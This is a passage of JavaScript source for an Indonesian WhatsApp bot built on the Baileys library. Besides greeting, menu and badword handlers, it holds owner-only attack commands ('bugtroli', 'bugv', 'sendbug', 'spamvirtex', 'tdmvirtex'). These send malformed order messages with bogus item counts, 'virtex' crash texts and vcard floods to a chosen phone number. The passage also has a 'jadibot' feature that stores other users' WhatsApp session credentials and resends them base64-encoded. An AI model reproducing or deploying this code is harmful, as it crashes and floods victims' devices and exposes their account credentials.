		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
	    const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
		const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
		
		    if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
            if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
            if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
            if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
			let authorname = xdev.contacts[from] != undefined ? xdev.contacts[from].vname || xdev.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
		
		
		
      

	
            



//Jika ada yg kirim pesan "p" botz akan respon
				if (salam.includes(messagesC)) {
				if (isSpammerr) return 
				if (isOwner) return 
			    if(isExtream) return
				spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
		         if(autosticker === true) return sendSticker(ucapsalam, sticker)
				}
				
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon
	            if (budy.includes(`ualaikum`)) {
            	if (isOwner) return 
                   if (isSpammerr) return 

		          spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
                  if(autosticker === true) return sendSticker1(kumsalam, sticker)
                  
                  }
				
//Jika ada yg kirim pesan "menu" bot akan respon
				if (menu.includes(messagesC)) {
				if (isSpammerr) return 
			    if (isOwner) return 
				reply(`*Hai kak ${pushname} untuk mengakses menu ketik ${prefix}menu ya* 😉`)
				spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
				}
				
				
//Jika ada yg toxic botz akan merespon
			if (bad.includes(messagesC)) {
				if (isSpammerr) return 
				if(isOwner) return
		           spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
				daui = fs.readFileSync('./temp/toxic/toxic.mp3')
				await xdev.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true})
				await xdev.sendMessage(from, istigfar, sticker)
				}
				
//Jika ada yg bilang bot maka botz akan merespon
			 if (badud.includes(messagesC)) {
				  if(isExtream) return
				if (isSpammerr) return
				spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },5000)
				sendMess(hayuk)
				}
				
				 

   


   
    
       
        
            


     const floc = {
                    'key': {
                        'participant':  '0@s.whatsapp.net'
                    },
                    'message': {
                        'locationMessage': {
                            'name': fake,
                            'jpegThumbnail': virgam
                        }
                    }
                }
     
  
       
  if (atibot === true) return





















 

 











 

 
























































































































































































       
       
   
try{
switch (command) {
	
    case 'menu':
    case 'help':

   
   
    costum(`*Loading...*`, text, tescuk, fake)
	run = process.uptime() 
    teks = `${kyun(run)}`


mhan = await xdev.prepareMessage(from, thumb, image, {thumbnail: fakethumbnail})
gbutsan = [
  {buttonId: 'INFO BOTZ', buttonText: {displayText: 'INFO BOTZ'}, type: 1},
  {buttonId: `${prefix}donasi`, buttonText: {displayText: `DONASI`}, type: 1}
]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: help.menu(autosticker, namalu,chatBot, settings, nomerOwner, forwarding, fake, autoread, autovn, typing, Antibuggc,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, cmhit, pushname, ucapanWaktu, prefix, banChats, time2, week, weton, calender),
    footerText: `Speed     : ${latensi.toFixed(4)} Second\nRuntime : ${teks}\n ${namalu}`,
    buttons: gbutsan,
    headerType: 4
}
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
        
        contextInfo: { forwardingScore: totalForward, isForwarded: forwarding}
            })
           	break
           
           
          
           
           
           
           case 'bugtroli':

     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
xdev.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
xdev.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
//bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
//bug(targett)
}

attack(dev.key.remoteJid)
break


           
           //by Febza bot
           case 'nulis':
           case 'tulis':
if (args.length < 1) return reply('Yang mau di tulis apaan?')
teks = args.join(' ')
reply(mess.wait)
nulis = encodeURIComponent(teks)
res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
if (res.data.error) return reply(res.data.error)
buff = Buffer.from(res.data.result.split(',')[1], 'base64')
xdev.sendMessage(from, buff, image, {quoted: dev}).catch(e => {
  return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
break
           
           
           
     
           

           
           
           
           case 'bugv':
           if (!isOwner) return sendvn(wuy)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': tdm13(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)
           }
           break
           
           
           
           
           
          
           
           
           
           
           case 'tekschat':
           if(!q) return reply (`Teksnya mana ?\nContoh : ga ada menu bang`)
           teksChat = `${q}`
           reply(`
Berhasil mengganti teksChat Bot
jika ada yang command ke bot maka bot
akan menjawab : ${q}`)
       break    
           
           
           
    
    
      
      case 'viper':
          if (!isOwner) return sendSticker(gaboleh, sticker)
    {
    	reply('*Loading...*')  
    await xdev.sendMessage(from, viper(prefix), text)            
    await xdev.sendMessage(from, viper2(prefix), text)            
    await xdev.sendMessage(from, viper3(prefix), text)            
    await xdev.sendMessage(from, viper4(prefix), text)            
    await xdev.sendMessage(from, vipi(prefix), text)            
           }
      break
           
           
           
           
           
           case 'tdmvirtex':
                 if (!isOwner) return sendvn(wuy)
          if(sendbug === true) return reply("Tunggu sampai proses sendbug selesai, kalo tetap memaksa memgirim lebih dari satu nomer maka akun whatsapp LU bakal terblokir")
           {
           reply('*Loading...*')  
           sendbug = true
               await xdev.sendMessage(from, tdm1(prefix), text)            
                await xdev.sendMessage(from, tdm2(prefix), text)       
                 await xdev.sendMessage(from, tdm3(prefix), text)    
                await xdev.sendMessage(from, tdm4(prefix), text)              
                await xdev.sendMessage(from, tdm5(prefix), text)     
                await xdev.sendMessage(from, tdm6(prefix), text)
                 await xdev.sendMessage(from, tdm7(prefix), text) 
                 await xdev.sendMessage(from, tdm8(prefix), text)
               await xdev.sendMessage(from, tdm9(prefix), text)            
                await xdev.sendMessage(from, tdm10(prefix), text)       
                 await xdev.sendMessage(from, tdm11(prefix), text)    
                await xdev.sendMessage(from, tdm12(prefix), text)              
                await xdev.sendMessage(from, tdm13(prefix), text)     
                await xdev.sendMessage(from, tdm14(prefix), text)
                await xdev.sendMessage(from, "*COMPLETE*", text)
           }
           sendbug = false
                break;
           
           
           
      
           
           
           
           //------------------< Enable / Disable >-------------------
            case 'antibadword':
                 if(isExtream) return
                if (!isGroup) return reply('Hanya bisa di group')
                if ((args[0]) === 'on') {
                    if (Toxic) return reply(`Udah aktif`)
                    grupbadword.push(from)
					fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
					reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else if ((args[0]) === 'off') {
                    yahu = grupbadword.indexOf(from)
                    grupbadword.splice(yahu, 1)
                    fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
                    reply('antibadword grup nonaktif')
                } else if (!q) {
                      sendButMessage(from, `MODE ANTIBADWORD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
                
            case 'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                reply(bi)
                break
            
           
					
					
					
           
           
          
case 'addbadword':
                if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
                if (args.length < 1) return reply(`masukkan kata`)
                if (isKasar(args[1].toLowerCase(), badword)) return reply(`Udah ada`)
                addBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case 'delbadword':
                if (!isOwner) return reply('Hanya admin dan owner')
                if (args.length < 1) return reply(`masukkan kata`)
                if (!isKasar(args[1].toLowerCase(), badword)) return reply(`Ga ada`)
                delBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return reply('Hanya owner yang bisa')
                if (args.length < 1) return reply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    reply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    reply('Sukses')
                }
                break




    

    

case 'antichatbot':
                if (!isOwner) return sendSticker(gaboleh, sticker)
                if ((args[0]) === 'on') {
                  if(chatBot === true) return reply("Udah aktif")
                    chatBot = true
					reply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
                } else if ((args[0]) === 'off') {
                   if(chatBot === false) return reply("Sudah mati")
                    chatBot = false
					reply(`Berhasil mematikan Antichatbot`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
                

 
           
           case 'jadibot':
client.version = [2, 2119, 6]
client.browserDescription = ['INFINITY','Desktop','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await xdev.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : dev,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       xdev.deleteMessage(from, scen.key)
  }, 30000);
})  
client.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = client.base64EncodedAuthInfo()
  fs.writeFileSync(`./sampah/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
client.on('chat-update', async (chat) => {
	require('./index.js')(client, chat)
})    
await client.connect().then(async ({user}) => {
	listjadibot1.push(client.user)
reply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
           
           
           case 'stopjadibot':
if (!isOwner && !dev.key.fromMe) return reply("tidak bisa stopjadibot kecuali owner")
try {
reply('Oke')
fs.unlinkSync(`./sampah/${sender}.json`)
client.close()
} catch {
reply('Oke')
client.close()
}
break
           
           
           case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot1) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;
        
           
           
           
           
           case 'spamvirtex':    
           
                   if (!isOwner) return sendvn(wuy)
                     try {                 
                     reply('*Loading...*')
                    if (args.length < 1) return jawab(`Penggunaan ${prefix}spamvirtex nomor`)
					if (args[0].startsWith('08')) return jawab('Gunakan kode negara kak')
			        if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
					var nilaiAwal = 1;
                    while(nilaiAwal <=2) { 
                    await xdev.sendMessage(`${q}@s.whatsapp.net`, emoji1(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, emoji2(prefix), text, {contextInfo: forward})
                    await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex12(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex11(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex10(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex9(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex8(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex5(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex4(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex3(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex2(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtag(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
                     nilaiAwal++}
					await xdev.sendMessage(from, `*Sukses send virtex sebanyak 14 virtex ke nomor ${q}*`, text, {quoted : dev})
					} catch (e) {
					console.log('Error :', e)
					jawab(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
					}                        
					break
					
					
					
					
           case 'kbbi':
					if (args.length < 1) return reply('Apa yang mau dicari um?')
					asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					reply('Menurut Kbbi:\n\n'+asw.result)
					break
           
           
           
                
           
           
           
           
           
           case 'sendbug':    
                    if (!isOwner) return sendvn(wuy)
                      if(sendbug === true) return reply(`*ALERT* \nEeeitss, tunggu sampai proses sendbugnya selesai ya kak, kalo tetep maksain sendbug lebih dari satu nomer, nanti nomer kakak akan terbanned, trus aku nanti bisa kesepian deh :)`)
                      if(sendbug === true) return reply("Untung ada aku yang mencegah, klo gak bisa kena banned tadi 😌")
                      if(!isOwner) return reply('*Khusus owner*')
                      buttons = [{buttonId: `${prefix}warmode on`, buttonText: {displayText: 'AKTIFKAN'}, type: 1}, {buttonId: `${prefix}warmode off`, buttonText: {displayText: 'MATIKAN'}, type: 1}]
                      buttonsMessage = {footerText:'Klik aktifkan', 
                      contentText:`Harus mengaktifkan warmode dulu`,buttons,headerType:1}
                      prep = await xdev.prepareMessageFromContent(from,{buttonsMessage},{quoted: dev})
                      if (!isWarmode) return xdev.relayWAMessage(prep)
                      if (args.length < 1) return jawab(`Penggunaan ${prefix}sendbug nomor`)
					  if (args[0].startsWith('08')) return jawab('Gunakan kode negara kak')
			          if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
                      
                      try {                 
                     reply('*Loading...*')
                 sendbug = true
			   var nilaiAwal = 1;
                     while(nilaiAwal <=2) { 
			var kirim = await  xdev.prepareMessageFromContent(`${q}@s.whatsapp.net`, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': davizin,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': tdm13(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                await xdev.relayWAMessage(kirim)
       await  xdev.sendMessage(`${q}@s.whatsapp.net`, tdm7(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                })
                
               await xdev.sendMessage(`${q}@s.whatsapp.net`, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: sampah,
                              }, location,
                              {quoted: {
                             key: {
                               participant: '0@s.whatsapp.net'
                             },
                           message: {
                        orderMessage: {
                          itemCount: 2,
                               status: 1,
                       surface: 10,
                      message: 'NOPE',
                            orderTitle: fake,
                             sellerJid:'0@s.whatsapp.net'}
                             }},
                             contextInfo: forward})
                             
                             
                       xdev.sendMessage(`${q}@s.whatsapp.net`, {
                        'groupName': 'NOPE',
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': fs.readFileSync('./stik/sampah.jpg')
                    }, MessageType.groupInviteMessage, {
                        'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': 4,
                                    'status': 1,
                                    'surface': 1,
                                    'orderTitle': fake,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }
                    })         
			
                     let inilist = []
                     for (let i of ownerNumber) {
                     const vname = xdev.contacts[i] != undefined ? xdev.contacts[i].vname || xdev.contacts[i].notify : undefined
                     inilist.push({"displayName": 'X - Dev Team',"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${xdev.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\n+ \nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nitem1.X-ABLabel:Ponsel\nEND:VCARD`})}
                  
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, {"displayName": `${inilist.length} kontak`,"contacts": inilist }, 'contactsArrayMessage')
                     nilaiAwal++}
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Bug terkirim', 'cyan'))
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Otw delchat, buka wa nya terus agar delchat sukses', 'cyan'))
                     await xdev.modifyChat(`${q}@s.whatsapp.net`, ChatModification.delete)
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, 'COMPLETE', text)
                     await xdev.sendMessage(from, `*Sukses send bug sebanyak 11 bug ke nomor ${q}*`, text)
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('sukses delchat sekarang wa sudah normal', 'cyan'))     
					} catch (e) {
					console.log('Error :', e)
					jawab(`*Gagal mengirim bug!* \n*System Error*\nPastikan jaringan stabil dan masukan nomer whatsapp dengan benar`)
					}   
                    sendbug = false                     
					break
           
           
           
           
           

           
           
           
           
           
           
           
           
           
           case 'spam':
				if (!isOwner && !dev.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					xdev.sendMessage(from, argzi[0], MessageType.text)
				}
				break
         
           
           
           
     

      
           
           
                    
                    
           
           
           case 'buglist':
             if (!isOwner) return sendvn(wuy)
                res = await xdev.prepareMessageFromContent(from, {
                    'listMessage': {
                        'title': fake,
                        'description': '' + virtex5(prefix),
                        'buttonText': 'Silakan Pilih Bug',
                        'listType': 'SINGLE_SELECT',
                        'thumbnail': virgam,
                        'sections': [{
